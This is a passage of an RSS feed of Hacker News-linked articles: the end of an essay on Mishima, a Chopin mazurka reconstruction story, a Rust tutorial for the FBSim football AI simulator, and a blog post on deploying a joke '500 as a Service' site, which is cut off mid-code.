</p><p>At least 30 novels and essays have been translated into English, including <em>Life for Sale</em>. There are also two more biographies. <em>Persona</em>&nbsp;is a meticulously researched doorstopper by Naoki Inose, novelist and ex-governor of Tokyo, and Hiroaki Sato. <em>Yukio Mishima</em>&nbsp;is by British author Damian Flanagan.</p>
<p>Another British Mishima enthusiast was the rock star David Bowie, who appears to have planned his own death in 2016 with Mishima-like artistic precision. Bowie painted a portrait of Mishima, which he hung on the wall of his Berlin apartment in the late 1970s. In the 1990s, he bought a bronze bust of Mishima by British sculptor Sir Eduardo Paolozzi at Sotheby’s.&nbsp; More recently, he referred to the opening of <em>Spring Snow</em>&nbsp;in his 2013 album <em>The Next Day</em>: “Then we saw Mishima’s dog / Trapped between the rocks / Blocking the waterfall.”</p>
<p>The accent on the lighter, more humorous side of Mishima may have contributed to what seems to be a subconscious reassessment within Japan. There is also the fact that some of his political stances — on validating the constitutional status of the Self-Defense Forces, on protecting Japan’s traditional culture — no longer seem extreme.</p>
<p>Another impression came to me forcefully while watching the debate between Mishima and the radical students who were occupying the Tokyo University lecture hall. The cinema audience was agog at the huge moral issues that were being argued in a way that could never happen in today’s world.</p>
<p><a href="http://www.petertasker.asia/site/wp-content/uploads/2020/11/MishimaNAR.jpg"><img src="http://www.petertasker.asia/site/wp-content/uploads/2020/11/MishimaNAR-460x339.jpg" alt="Mishima engages with student Masahiko Akuta, now a respected theatrical impresario and actor" width="460" height="339" srcset="http://www.petertasker.asia/site/wp-content/uploads/2020/11/MishimaNAR-460x339.jpg 460w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/MishimaNAR-768x566.jpg 768w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/MishimaNAR-700x516.jpg 700w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/MishimaNAR-787x580.jpg 787w, http://www.petertasker.asia/site/wp-content/uploads/2020/11/MishimaNAR.jpg 1447w" sizes="(max-width: 460px) 100vw, 460px"></a> Mishima engages with student Masahiko Akuta, now a respected theatrical impresario and actor
</p><p>In his much-misunderstood book, <em>The End of History and the Last Man</em>,&nbsp; Francis Fukuyama uses the ideas of philosopher Friedrich Nietzsche to speculate about what kind of landscape the post-historical “last men” will inhabit, once liberal democracy has triumphed everywhere. The answer is a world devoid of great art, struggle, risk, wisdom and self-knowledge. The last men, Fukuyama posits, “will be concerned above all for personal health and safety … content to sit at home congratulating themselves on their own broadmindedness and lack of fanaticism.”</p>
<p>Mishima’s dislike of Anglo-Saxon liberal democracy came from Nietzsche. According to Flanagan, “Mishima’s bond with Nietzsche was described by Mishima’s father after his son’s death as of an intensity beyond imagination.”</p>
<p>Mishima committed <em>seppuku</em> just 25 years after the end of World War II, much too soon for him to escape being dismissed as an unbalanced reactionary throwback to the age of militarism. Fifty years on, the last man is here, placidly enjoying his lockdown thanks to Zoom, Netflix and Uber Eats, totally comfortable with the prospect of a future controlled by artificial intelligence and big data.</p>
<p>Perhaps we need a Mishima to shock us out of our complacency.</p>

		
		
			</div></div>]]>
            </description>
            <link>http://www.petertasker.asia/articles/mishima-in-the-twenty-first-century/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25232488</guid>
            <pubDate>Fri, 27 Nov 2020 20:54:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Deciphering Chopin’s shorthand in the posthumous Mazurka in F minor (2018)]]>
            </title>
            <description>
<![CDATA[
Score 41 | Comments 6 (<a href="https://news.ycombinator.com/item?id=25232460">thread link</a>) | @spekcular
<br/>
November 27, 2020 | https://www.claviercompanion.com/article-details/deciphering-chopin-s-shorthand-in-the-posthumous-mazurka-in-f-minor | <a href="https://web.archive.org/web/*/https://www.claviercompanion.com/article-details/deciphering-chopin-s-shorthand-in-the-posthumous-mazurka-in-f-minor">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-type="text"><p>If someone had told me a decade ago that I was going to produce the first (and, so far, only) published reconstruction of Chopin's posthumous Mazurka in F Minor that includes every uncanceled measure of the composer's sketch, I would have laughed. But apparently when a performance opportunity inspires a research obsession, unexpected things can happen.</p><p>I'm no piano virtuoso, but for some years I've performed chamber music and solo programs on a church recital series. As a student I learned Fauré's B-Minor Nocturne; Scriabin's Preludes, Op. 74; and Scott Joplin's <em data-redactor-tag="em" data-verified="redactor">Magnetic Rag</em>—each of which is its respective composer's last completed composition for solo piano (and in the case of the latter two, the composer's last completed composition). Eventually I had the idea of performing an entire recital of such works, adding Schubert's Sonata in B-flat, D. 960; Schumann's <em data-redactor-tag="em" data-verified="redactor">Ghost Variations</em>; Brahms's <em data-redactor-tag="em" data-verified="redactor">Klavierstücke</em>, Op. 119; and the piece that is generally considered Chopin's last: the Mazurka in F Minor, Op. 68, No. 4.<br></p><p>Of these last completed piano works, the mazurka was the least finished. Chopin customarily composed at the piano, then notated a sketch, and lastly wrote a fair copy. But for the work published posthumously as Op. 68, No. 4, he only got as far as the sketch, a confusing one-page document that was discovered after his death in 1849.<br></p><p>Virtually all editions of the complete Chopin mazurkas include the same sixty-two-bar A–B–A version published in 1855 by former Chopin copyist Julian Fontana, based on a fair copy by cellist Auguste Franchomme, a close friend of the composer and dedicatee of his Cello Sonata. (The Henle edition exactly follows Franchomme's copy, which is more accurate in several respects than Fontana's published version.) But I was aware of a longer version from pianist Arthur Rubinstein's 1967 RCA recording of the complete Chopin mazurkas—a 1965 reconstruction by Polish pianist-musicologist Jan Ekier that adds a C section in F major. I purchased a copy of this A–B–A–C–A version and assumed I'd play it on my recital.<br></p><p>Looking up the work in Maurice Hinson's <em data-redactor-tag="em" data-verified="redactor">Guide to the Pianist's Repertoire,</em> however, I learned of a more complete 1975 reconstruction by British pianist Ronald Smith as published by Hansen House. It turned out to be out of print, but I tracked down a copy via interlibrary loan. The C section in Smith's A–B–A–C–A version is thirtytwo bars, versus sixteen in Ekier's; in his foreword, Smith specifically criticizes Ekier's version, saying that it "takes a disastrous short-cut in the F major episode."<br></p><p>Wondering whether there had been any other published reconstructions, I of course did a Google search, which led me to "Chopin's Last Style," an article by the eminent Chopin authority Jeffrey Kallberg that appeared in the Summer 1985 issue of the <em data-redactor-tag="em" data-verified="redactor">Journal of the American Musicological Society</em> and was republished with slight emendations as a chapter in his 1996 book <em data-redactor-tag="em" data-verified="redactor">Chopin at the Boundaries: Sex, History, and Musical Genre</em>. Kallberg contends that the piece's form is actually A–B–A–C–A–B–A, which struck me as the solution to one riddle in the sketch— the two different versions of the left hand of the B section's last measure (the second version is printed as an ossia passage in the Ekier and Smith editions). It seems likely that one version of that measure is intended for the first B section, the other for the second B.<br></p><p>Kallberg also provides a detailed summary of the various attempts to reconstruct the piece, which in turn led me to two other versions: an edition by Polish composer-pianist Milosz Magin, published in 1983 by Editions Concertino of Paris, and British pianist John Vallier's 1986 edition (now out of print) of a reconstruction by British musicologist Arthur Hedley, who as the first modern scholar to view the sketch in 1951 had discovered the long-missing C section. The thirty-two-bar C section in Magin's A–B–A–C–A version is structurally identical to Smith's. The form of the Hedley-Vallier version is (as Kallberg proposed) A–B– A–C–A–B–A, with the aforementioned slight variation at the end of the second B; but its final A section is oddly truncated, and the thirty-two-bar C section includes material that is clearly crossed out in the sketch.<br></p><p>In "Chopin's Last Style," Kallberg states that "numerous attempts have been made to decipher the document, none entirely successful." Playing through the four published versions, I couldn't help drawing the same conclusion; I could not see performing any of the four verbatim. So I thought I'd put together a composite version, just for my own personal use, incorporating the most convincing readings from the various editions.<br></p><p>But how does one make those decisions? My own sense of musical style, and of Chopin's style in particular, provided a general basis. Ultimately, though, I had to study the sketch itself, a facsimile of which was printed in several of the published editions.</p><p>One of the first spots I examined was a segment that Kallberg cites as having been omitted in previous reconstructions (Ekier, Magin, and Smith all fail to include it): the bass-clef passage that Chopin labeled 3ci (an abbreviation for <em data-redactor-tag="em" data-verified="redactor">trzeci</em>, Polish for "third"). Kallberg's article interprets this segment as the left hand for the transition to the second B section, and the Hedley- Vallier edition adopts that interpretation as well. I took one look at this passage in the sketch and—to my great surprise—drew a completely different conclusion.</p><p>The passage consists of a quarter note and four eighth notes, connected by an ascending slur (the only slur in the entire sketch) that continues up and to the right of the last note; the beam over the eighth notes also continues up and to the right of the last note. To me, this looked like shorthand for an ascending tonic arpeggio that continues upwards (despite the fact that the last notated pitch is a D-flat, which sounds wrong even if the passage is used as a transition to the second A; Kallberg now conjectures that Chopin intended this note to be a C). And the function of the passage seemed clear to me as well: a little extra flourish to distinguish the final iteration of A as the end of the piece. Indeed, the A section ends three different ways—first leading to B, later leading to C, and finally ending the piece—and Chopin specifically labels this ending the "third." (I find it highly unlikely that the passage represents the second A-to-B transition. My examination of all the Chopin sectional dances—the mazurkas, polonaises, and waltzes—reveals that in A–B– A–C–A–B–A rondos where the first and second B sections are in the same key, the second transition from A to B is always identical to the first.)<br></p><p>But the <em data-redactor-tag="em" data-verified="redactor">3ci </em>passage isn't the only sketch segment that is typically omitted. At the end of the C section, Chopin wrote one measure above the staff in (presumably) treble clef and one measure plus a quarter note below the staff in bass clef. Ekier, Smith, and Magin include the former but omit the latter; Hedley-Vallier includes the latter but omits the former. No previous reconstruction had included every measure of the sketch that Chopin had not crossed out. So I made up my mind that my version would be the first—and this required figuring how to incorporate both these segments at the end of the C section. Thinking more as a composer than as a musicologist, I came up with a solution that seemed to make musical sense.<br></p><p>Barely had I drawn these conclusions than I began to question how I could have solved riddles that had stumped a whole series of eminent Chopin specialists. So first I sent my reconstruction to an esteemed scholar who has dealt extensively with another composer's manuscripts. She was quite encouraging, as were the other editors and teachers I then asked to review my work. Eventually I got up the nerve to send my version to Jeffrey Kallberg himself, who responded, "You've solved a number of puzzling passages that have eluded other researchers, including myself (I'm thinking especially of your very sensible rendition of measure 95 [the end of the C section])." He also generously provided a great deal of critical feedback that led to numerous improvements in both my reconstruction and the accompanying editorial notes.<br></p><p>By this time, I realized that my version might well be of interest to other pianists and scholars, so I began submitting it for publication, and fortunately Richard Walters of Hal Leonard decided to issue it as part of that company's Schirmer Performance Editions series. It appeared in print in 2012—the year after I gave its premiere performance on my last-completed-pianoworks recital.<br></p><p>All music schools try to link performance and scholarship. But sometimes, by pure serendipity, one leads seamlessly to the other—and then back again.<br></p></div></div>]]>
            </description>
            <link>https://www.claviercompanion.com/article-details/deciphering-chopin-s-shorthand-in-the-posthumous-mazurka-in-f-minor</link>
            <guid isPermaLink="false">hacker-news-small-sites-25232460</guid>
            <pubDate>Fri, 27 Nov 2020 20:50:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[FBSim: Football-playing AI agents in Rust]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25232447">thread link</a>) | @lukastyrychtr
<br/>
November 27, 2020 | https://iantayler.com/2020/11/22/fbsim-football-playing-ai-agents-in-rust/ | <a href="https://web.archive.org/web/*/https://iantayler.com/2020/11/22/fbsim-football-playing-ai-agents-in-rust/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>I took a two week vacation in early November. Somehow I decided to spend it learning a bit more about <a href="https://www.rust-lang.org/">Rust</a> and Reinforcement Learning (RL), a sub-field of AI that I haven’t explored much before. We won’t be talking about RL this post, though. That’s for a future blogpost.</p>



<p> All of that lead to me writing <a rel="noreferrer noopener" href="https://github.com/IanTayler/fbsim" target="_blank">FBSim</a><sup>1</sup>, which I struggled to describe as <em>“a game-like football simulation environment for trying out AI ideas, written in Rust</em>“. As a game-dev framework, I used <a href="https://amethyst.rs/">amethyst</a>. Rust, amethyst and FBSim are all open source.</p>



<p>The idea is the following: you write functions defining how each of your players are to behave according to their role (forward, left, right, defender and goalie)<sup>2</sup> and according to the environment, which includes information about the position of every teammate, every opponent, the ball and the net. FBSim does the rest for you.</p>



<p>In Rust terms, all you need to do in order to make your own AI for the game and see it play against other AIs is to implement the <code>Engine</code> <em>trait</em> –a trait is like a <code>protocol</code> in swift, an <code>interface</code> in Go, or an <code>Abstract Base Class</code> in python: essentially, a set of methods–, then you register your engine and change the configuration to make the players use it.</p>



<p>We’ll be implementing a simple AI for FBSim from scratch later on in the blogpost (beginners to Rust are welcome too), but first let me show you how the game looks like.</p>



<p>These are two very simple stock AIs playing each other.</p>



<figure><div>
<p><span><iframe width="1100" height="619" src="https://www.youtube.com/embed/OGKFFvp1zzA?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en&amp;autohide=2&amp;wmode=transparent" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation"></iframe></span></p>
</div><figcaption><code>BasicWingWait</code> <em>detroying </em><code>Basic</code> on a game</figcaption></figure>



<p>Exciting? <em>No? </em>Well… uhh… it’s a bit more exciting if you write the AI yourself.</p>



<p>Let’s go ahead with the implementation.</p>



<h2>Get (to) the sources</h2>



<p>First, let’s download the source code, and checkout the tag for the code that’s compatible with this blogpost.</p>



<pre><code>git clone git@github.com:IanTayler/fbsim.git
cd fbsim
git checkout blogpost-1b # APIs may change in the future!</code></pre>



<h2>Get Rust (if necessary)</h2>



<p>If you have Rust and <code>cargo</code> installed, you’re ready to go ahead. If not, then you should check out <code><a href="https://rustup.rs/">rustup</a></code>. Once you’ve installed <code>rustup</code>, and used it to install the compiler (I’m using 1.47.0) and <code>cargo</code>, you’re good to go.</p>



<p><strong>Note: </strong>FBSim uses <code>const fn</code> with a <code>match</code> statement, so you will need a relatively new version of the Rust compiler. If you’re getting errors mentioning <code>const fn</code> and <code>match</code>, then you probably need to update your compiler to a newer version.</p>



<h2>Build FBSim</h2>



<h3>Linux</h3>



<p>In order for amethyst to work, you should first install some system dependencies, as detailed <a href="https://github.com/amethyst/amethyst#dependencies">here</a>. Install the dependencies according to your distribution and then you can proceed to run the following.</p>


<pre title="">source ./env.sh # necessary due to a rendy bug with vulkan
cargo run
</pre>


<h3>MacOS</h3>



<p>If you’re under macOS, you first need to change the <code>Cargo.toml</code> to use <code>metal</code> instead of <code>vulkan</code>.</p>



<p>Your final Cargo.toml file should look like this:</p>


<pre title="">[package]
name = "fbsim"
version = "0.1.0"
authors = ["Ian Tayler &lt;iangtayler@gmail.com&gt;"]
edition = "2018"
readme = "README.md"
repository = "https://github.com/IanTayler/fbsim/"
license = "MIT"

# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html

[dependencies.amethyst]
version = "0.15.3"
features = ["metal"]

[dependencies.serde]
version = "1.0.104"

[dependencies]
rand = "0.7.0"
rand_distr = "0.3.0"
</pre>


<p>Now, you can save the file and run:</p>


<pre title="">cargo run
</pre>


<p>I didn’t test this on a mac, so these instructions are based on speculation. Let me know if it doesn’t work for you.</p>



<p><strong>Note: </strong>It was brought to my attention that some people were having <a href="https://github.com/gfx-rs/gfx/issues/2309#issuecomment-506130902">the following issue</a> mentioning <code>gfx-backend-metal</code> and <code>xcrun</code> on macOS. If that’s you, follow the linked issue to get a likely solution.</p>



<h3>Windows</h3>



<p>I think the simple <code>cargo run</code> should work by itself under windows. Let me know if that’s not the case!</p>



<h2>Checking that it works</h2>



<p>If it works, you should see something like the following screenshot. The players should be moving about. Some of them could be standing still. That’s normal.</p>



<figure><a href="https://compwit.files.wordpress.com/2020/11/2020-11-22_13-57-35.png"><img data-attachment-id="127" data-permalink="https://iantayler.com/2020-11-22_13-57-35/" data-orig-file="https://compwit.files.wordpress.com/2020/11/2020-11-22_13-57-35.png" data-orig-size="700,724" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2020-11-22_13-57-35" data-image-description="" data-medium-file="https://compwit.files.wordpress.com/2020/11/2020-11-22_13-57-35.png?w=290" data-large-file="https://compwit.files.wordpress.com/2020/11/2020-11-22_13-57-35.png?w=700" src="https://compwit.files.wordpress.com/2020/11/2020-11-22_13-57-35.png?w=700" alt="" srcset="https://compwit.files.wordpress.com/2020/11/2020-11-22_13-57-35.png 700w, https://compwit.files.wordpress.com/2020/11/2020-11-22_13-57-35.png?w=145 145w, https://compwit.files.wordpress.com/2020/11/2020-11-22_13-57-35.png?w=290 290w" sizes="(max-width: 700px) 100vw, 700px"></a></figure>



<h2>What an FBSim Engine is</h2>



<p>What we’re going to do now is to implement a new <code>Engine</code> and try it out against one of the stock ones.</p>



<p>Implementing an <code>Engine</code> amounts to implementing a bunch of functions that take as input a representation of the state of the game, and output a description of how the agent should behave next frame.</p>



<p>In essence, we’ll be telling our players what to do based on what they can see.</p>



<h3>Engine input</h3>



<p>As input we’ll get an <code>EngineData</code> struct. Here is how it’s defined.</p>


<pre title="">/// Input for engine functions.
pub struct EngineData&lt;'a&gt; {
    pub ball_position: Vector2&lt;f32&gt;,
    pub own_position: Vector2&lt;f32&gt;,
    pub own: &amp;'a player::Player,
    pub own_type: &amp;'a player::PlayerType,
    pub own_net_position: Vector2&lt;f32&gt;,
    pub opponent_net_position: Vector2&lt;f32&gt;,
    pub teammates_position: Vec&lt;(PlayerType, Vector2&lt;f32&gt;)&gt;,
    pub opponents_position: Vec&lt;(PlayerType, Vector2&lt;f32&gt;)&gt;,
}

</pre>


<p>If you’re new to Rust. You can ignore the <code>'a</code>. It’s a <a href="https://doc.rust-lang.org/nomicon/lifetimes.html">lifetime</a> parameter. The rest should look somewhat familiar if you’ve used languages like C, C++, Go, etc. All the <code>pub</code>s just mean we want the fields and the struct to be publicly exported. Let’s look at the fields we actually care about.</p>



<p><code>ball_position: Vector2&lt;f32&gt;</code></p>



<p>This will have the <em>absolute</em> position of the ball –(0, 0) is the lower left of the screen–. You can access each coordinate by using <code>Vector2</code>‘s <code>x</code> and <code>y</code> fields. <code>Vector2</code>s also have special methods defined and most operations (<code>+</code>, <code>-</code>, <code>*</code>) behave like you’d expect if you’ve worked with <code>numpy</code> and similar libraries. </p>



<p>The actual <code>Vector2</code> type is defined in the <code><a href="https://docs.rs/nalgebra/0.18.0/nalgebra/">nalgebra</a></code> crate<sup>3</sup>. The <code>&lt;f32&gt;</code> part just means the values in each coordinate are 32bit floats.</p>


<pre title="">own_position: Vector2&lt;f32&gt;,
</pre>


<p>Same as above, but this will have the currently-running player’s position.</p>


<pre title="">own_net_position: Vector2&lt;f32&gt;,
opponent_net_position: Vector2&lt;f32&gt;,
</pre>


<p>You get the idea, right? Positions of the centers of both nets. <code>opponent_net</code> is where <em>you</em> are trying to score. These are also <em>always</em> absolute positions, so they will be the same value every time.</p>


<pre title="">teammates_position: Vec&lt;(PlayerType, Vector2&lt;f32&gt;)&gt;,
opponents_position: Vec&lt;(PlayerType, Vector2&lt;f32&gt;)&gt;,
</pre>


<p>Here we have a vector (<code>Vec</code>, similar to C++’s vectors, python’s lists, etc.) having the positions of all your 4 teammates (in the case of <code>teammates_position</code>) or the positions of your 5 opponents (in the case of <code>opponents_position</code>); along with the respective role of each of those opponents or teammates –each element is a pair with role first and position later–. We will not be using these two fields for the rest of this post, but if you plan on implementing a good engine, you probably should.</p>



<h3>Engine output</h3>


<pre title="">/// Return type of engine functions.
pub struct EngineTransition {
    /// Velocity vector (pixels per second). Magnitude will
    /// be cropped to player speed!
    pub velocity: Vector2&lt;f32&gt;,
    /// Which action to activate (if any).
    pub action: Option&lt;player::ActionType&gt;,
}
</pre>


<p>This is what our functions will return. We define our player’s velocity in the x and y axis, and we set the player’s action, if any.</p>



<p>The <code>action</code> field will be either <code>Some(ActionType::Kick)</code> if we want our player to kick the ball if it collides with them next frame and <code>None</code> if we want the player to gently push the ball forward.<sup>4</sup> There are no other actions in this version of FBSim.</p>



<h3>Engine trait (i.e. methods)</h3>


<pre title="">pub trait Engine {
    fn goalie(&amp;mut self, engine_data: EngineData) -&gt; EngineTransition;
    fn forward(&amp;mut self, engine_data: EngineData) -&gt; EngineTransition;
    fn left(&amp;mut self, engine_data: EngineData) -&gt; EngineTransition;
    fn defender(&amp;mut self, engine_data: EngineData) -&gt; EngineTransition;
    fn right(&amp;mut self, engine_data: EngineData) -&gt; EngineTransition;
    fn dispatch(&amp;mut self, engine_data: EngineData) -&gt; EngineTransition {
        match engine_data.own_type {
            PlayerType::Goalie =&gt; self.goalie(engine_data),
            PlayerType::Defender =&gt; self.defender(engine_data),
            PlayerType::Forward =&gt; self.forward(engine_data),
            PlayerType::Left =&gt; self.left(engine_data),
            PlayerType::Right =&gt; self.right(engine_data),
        }
    }   
}

</pre>


<p>What this says is we need to implement methods called <code>goalie</code>, <code>defender</code>, <code>left</code>, <code>right</code> and <code>forward</code>. Each will govern how each of our roles play. The <code>dispatch</code> method is already implemented by default, and it’s unlikely you’ll want to change it.</p>



<p>The only difference between roles is the position they start on in the field after each goal and the fact that goalies have a bigger hitbox.</p>



<h3>SimpleEngine trait</h3>



<p>When convenient, you can use <code>SimpleEngine</code>, which only asks that you implement an <code>engine_func</code> method and implements all the <code>Engine</code> methods for you.</p>



<p>This can be useful when you will use exactly the same code for <em>all </em>your roles. You just write that code once in <code>engine_func</code> and <code>SimpleEngine</code> uses it for <code>goalie</code>, <code>left</code>, <code>right</code>, etc. indistinctly.</p>


<pre title="">pub trait SimpleEngine {
    fn engine_func(&amp;mut self, engine_data: EngineData) -&gt; EngineTransition;
}
</pre>


<p>This is what we’ll be using. But you’ll likely want to have different methods for your different roles if you implement something more complex.</p>



<h2>Implementation</h2>



<h3>Minimal Engine implementation</h3>



<p>We’ll create a file <code>src/engines/myengine.rs</code>. That’s where our entire engine will live.</p>



<p>We’ll first create the silliest engine possible: we’ll always stay put and not do any actions. Later we’ll make a less silly engine.</p>


<pre title="">// src/engines/myengine.rs
//
// First import everything we need.
// "crate" are imports relative to our own code.
// So crate::components is under src/components, for example.
use crate::{        
    components::player::ActionType,
    engines::{EngineData, EngineTransition, SimpleEngine},
};                      
                    
// We don't need any fields. We just define an empty struct.
pub struct MyEngine;    

// We use `impl` to implement the `SimpleEngine` trait.
impl SimpleEngine for MyEngine {
    fn engine_func(&amp;mu…</pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://iantayler.com/2020/11/22/fbsim-football-playing-ai-agents-in-rust/">https://iantayler.com/2020/11/22/fbsim-football-playing-ai-agents-in-rust/</a></em></p>]]>
            </description>
            <link>https://iantayler.com/2020/11/22/fbsim-football-playing-ai-agents-in-rust/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25232447</guid>
            <pubDate>Fri, 27 Nov 2020 20:48:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Dungeon Map Doodler – Free D&D map maker]]>
            </title>
            <description>
<![CDATA[
Score 126 | Comments 15 (<a href="https://news.ycombinator.com/item?id=25232290">thread link</a>) | @toddr123
<br/>
November 27, 2020 | https://dungeonmapdoodler.com/index.html | <a href="https://web.archive.org/web/*/https://dungeonmapdoodler.com/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://dungeonmapdoodler.com/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25232290</guid>
            <pubDate>Fri, 27 Nov 2020 20:27:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How I Built a Planet-Scale Failure]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25232171">thread link</a>) | @manjana
<br/>
November 27, 2020 | https://sgfault.com/2020/05/03/500-aas.html | <a href="https://web.archive.org/web/*/https://sgfault.com/2020/05/03/500-aas.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>  <article itemscope="" itemtype="http://schema.org/BlogPosting">  <div itemprop="articleBody"> <p>A few days ago I built a new website, though calling it such might be a touch too generous. It’s called <em>500 as a Service</em> or <em>500aaS</em> for short. You can visit it on <a href="https://500asaservice.com/">500asaservice.com</a>. Don’t sue me if you find it disappointing. It’s meant to be a failure after all.</p> <p>I figured, with the wealth of things available to consume as a service nowadays, it felt just appropriate to altruistically offer a piece of failure on-demand, free of charge, to my fellow humans. I know, I may have probably peaked with this idea right here.</p> <p>Take it for what you may, but I probably got more out of building this website than you, dear reader, after contemplating it in befuddlement. I didn’t set out to build a lazy failure, mind you. I wanted to build a massively scalable one. And this poses a somewhat more interesting challenge. How did I do it?</p>  <p>The vision for 500aaS is as follows:</p> <blockquote> <p>Provide a planet-scale, elastic, resilient, secure and low-latency on-demand HTTP 500 service.</p> </blockquote> <p>Planet-scale, elastic… those couple of buzzword bingo entries hint at a cloud service… AWS maybe? Correct! (it was the <em>elastic</em> part that gave it away, wasn’t it?). In times past, the simplest way to deploy a site like this would’ve been to get hold of a server box somewhere, set up Apache or Nginx on it and configure the web server to always return 500 errors, regardless of the URL pattern it receives. Open this server up to the public Internet via a static IP address and voila: you got yourself a homemade failure.</p> <div><div><pre><code># Minimal nginx config that will get you 500 responses forever
# /etc/nginx.conf
events {}

http {
    server {
        location / {
            return 500;
        }
    }
}
</code></pre></div></div> <p>But there is a big caveat here. This is just one physical server we’re talking about. What if 500aaS took off big time and people started swarming onto my site, anxiously seeking their daily fix of foobar? The server could become overwhelmed, unable to even muster the processing power to serve a <em>faux</em> HTTP 500, and start returning real ones, if at all. You could argue this is technically still OK, as the whole point of 500aaS is to fail, but I’m a bit of a purist, so I coudn’t accept that possibility. The question remains then: how do I deploy a service like this so that it can serve endless botched responses in a controlled manner, to anyone, under any circumstances? By taking it to the cloud, of course!</p> <p>The easiest, most scalable way to host a site on AWS is to build it on top of their serverless stack: Lambda, DynamoDB… My application doesn’t need any state to remember it should be always serving a 500 response back so all I need is a simple Lambda function to run it. One like this maybe:</p> <div><div><pre><code><span>const</span> <span>fs</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>fs</span><span>'</span><span>);</span>

<span>exports</span><span>.</span><span>handler</span> <span>=</span> <span>async</span> <span>()</span> <span>=&gt;</span> <span>{</span>
    <span>const</span> <span>htmlBody</span> <span>=</span> <span>`
&lt;!doctype html&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;title&gt;500 Internal Server Error&lt;/title&gt;
    &lt;/head&gt;
    &lt;body&gt;
        &lt;h1&gt;Internal Server Error&lt;/h1&gt;
        &lt;p&gt;There was an error processing your request.&lt;/p&gt;
    &lt;/body&gt;
&lt;/html&gt;
    `</span><span>;</span>
    <span>const</span> <span>response</span> <span>=</span> <span>{</span>
        <span>status</span><span>:</span> <span>'</span><span>500</span><span>'</span><span>,</span>
        <span>statusDescription</span><span>:</span> <span>'</span><span>Internal Server Error</span><span>'</span><span>,</span>
        <span>headers</span><span>:</span> <span>{</span>
            <span>vary</span><span>:</span> <span>[{</span>
                <span>key</span><span>:</span> <span>'</span><span>Vary</span><span>'</span><span>,</span>
                <span>value</span><span>:</span> <span>'</span><span>*</span><span>'</span><span>,</span>
            <span>}],</span>
            <span>'</span><span>last-modified</span><span>'</span><span>:</span> <span>[{</span>
                <span>key</span><span>:</span> <span>'</span><span>Last-Modified</span><span>'</span><span>,</span>
                <span>value</span><span>:</span> <span>'</span><span>2017-01-13</span><span>'</span><span>,</span>
            <span>}],</span>
            <span>'</span><span>content-type</span><span>'</span><span>:</span> <span>[{</span>
               <span>key</span><span>:</span> <span>'</span><span>Content-Type</span><span>'</span><span>,</span>
               <span>value</span><span>:</span> <span>'</span><span>text/html</span><span>'</span><span>,</span>
            <span>}],</span>
        <span>},</span>
        <span>body</span><span>:</span> <span>htmlBody</span><span>,</span>
    <span>};</span>

    <span>return</span> <span>response</span><span>;</span>
<span>};</span>
</code></pre></div></div> <p>I want to return an error with the minimum amount of complexity and effort possible. Turns out it’s actually pretty hard to cause a Lambda function to truly crash, so I manually craft the 500 status codes instead. Is this cheating? Maybe, but it’s not like a user of this service would care. They just want to see a 500 error page, for God’s sake!</p> <p>Despite the simplicity of its implementation, this approach would still require me setting up an API Gateway as a frontend, which is good but not very cheap in the long run, and not entirely hassle-free. There is another option, and that is to serve the content as close as possible to the location it was requested from, and generating said response directly where it’s served. Does this sound like I’m talking about a CDN? Because that’s exactly what I’m talking about.</p> <p>If you’ve never come across this approach before, several cloud vendors and CDN providers let you ship your code directly to the servers at their edge points of presence, which means the client-server exchange journey is remarkably shortened. Instead of having the CDN as the middle-man that caches the content served from the actual web servers, the CDN now becomes <strong>the</strong> server. Wait a minute, aren’t CDNs just dumb caches serving static Internet files all over the planet? Well, not anymore! You can now run arbitrary code in them too which allows them to modify Internet payloads running through them on the fly, as well as generating new content dynamically!</p> <p>The first major vendor I know of that started offering this were Cloudflare, with <a href="https://workers.cloudflare.com/">Cloudflare Workers</a>. Workers have evolved a fair bit as a technology since they were first launched a few years ago. You can deploy pretty useful applications straight to their CDN using JavaScript or WASM, which unlocks Rust and even COBOL! The <a href="https://developers.cloudflare.com/workers/about/how-it-works/">technology</a> that enables this is pretty interesting but beyond the scope of this article. Anyway, getting started with Cloudflare Workers is fairly easy nowadays. Here’s a sample Worker JS script I put together:</p> <div><div><pre><code><span>addEventListener</span><span>(</span><span>'</span><span>fetch</span><span>'</span><span>,</span> <span>event</span> <span>=&gt;</span> <span>{</span>
  <span>event</span><span>.</span><span>respondWith</span><span>(</span><span>handleRequest</span><span>(</span><span>event</span><span>.</span><span>request</span><span>));</span>
<span>});</span>
<span>/**
 * Respond with HTTP 500
 * @param {Request} request
 */</span>
